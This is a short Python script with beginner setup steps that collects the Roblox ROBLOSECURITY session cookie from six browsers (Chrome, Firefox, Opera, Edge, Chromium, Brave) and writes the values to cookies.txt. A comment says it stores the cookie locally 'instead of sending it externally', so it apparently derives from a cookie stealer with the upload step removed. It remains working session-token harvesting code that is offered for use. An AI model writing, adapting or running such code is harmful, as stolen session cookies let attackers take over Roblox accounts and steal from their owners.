- THIS IS PYTHON CODE (idk if this works yet)

Steps to Use the Script
- Install Python (if not already installed):
- Download the latest version of Python for Windows from python.org and install it.
- Install the Required Module:
- Open the Command Prompt and run the following command to install the browser-cookie3 module:
pip install browser-cookie3
- Create a New Python File:
- Open your favorite text editor (such as Notepad or Visual Studio Code).
- Copy the Python code provided below into a new file.
- Save the file with a .py extension, for example, extract_cookies.py.
- Run the Script:
- Open the Command Prompt and navigate to the folder where you saved extract_cookies.py (use the cd command to change directories).
- Run the script by entering:
python extract_cookies.py
- The script will run and extract the ROBLOSECURITY cookies from supported browsers, then save them to a file named cookies.txt in the same folder.
- Review the Output:
- After the script has finished executing, open the cookies.txt file (created in the same folder) to see your saved cookie information.

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


import browser_cookie3 as bc
from threading import Thread

class Cookies:
    def __init__(self, savefile="cookies.txt"):
        # The file where your cookies will be stored locally.
        self.savefile = savefile

    def extract_roblox_security(self, cookiejar):
        """
        Iterates over the cookie jar and returns the ROBLOSECURITY cookie value,
        if found (and if the cookie's domain contains 'roblox.com').
        """
        for cookie in cookiejar:
            if cookie.name == 'ROBLOSECURITY' and 'roblox.com' in cookie.domain:
                return cookie.value
        return None

    def get_browser_cookie(self, browser_func, browser_name):
        """
        Attempts to extract the ROBLOSECURITY cookie using the specified browser
        cookie function (e.g., bc.chrome). If successful, it saves the cookie
        locally instead of sending it externally.
        """
        try:
            cookiejar = browser_func(domain_name='roblox.com')
            cookie = self.extract_roblox_security(cookiejar)
            if cookie:
                with open(self.savefile, "a") as file:
                    file.write(f"{browser_name}: {cookie}\n")
                print(f"Stored {browser_name} cookie in {self.savefile}.")
            else:
                print(f"No ROBLOSECURITY cookie found in {browser_name}.")
            return cookie
        except Exception as e:
            print(f"Error extracting from {browser_name}: {e}")
            return None

    def get_chrome(self):
        return self.get_browser_cookie(bc.chrome, "Chrome")

    def get_firefox(self):
        return self.get_browser_cookie(bc.firefox, "Firefox")

    def get_opera(self):
        return self.get_browser_cookie(bc.opera, "Opera")

    def get_edge(self):
        return self.get_browser_cookie(bc.edge, "Edge")

    def get_chromium(self):
        return self.get_browser_cookie(bc.chromium, "Chromium")

    def get_brave(self):
        return self.get_browser_cookie(bc.brave, "Brave")

    def run_all(self):
        # Start a thread for each supported browser.
        Thread(target=self.get_chrome).start()
        Thread(target=self.get_firefox).start()
        Thread(target=self.get_opera).start()
        Thread(target=self.get_edge).start()
        Thread(target=self.get_chromium).start()
        Thread(target=self.get_brave).start()

if __name__ == "__main__":
    cookies = Cookies()  # This will save cookies to cookies.txt by default.
    cookies.run_all()
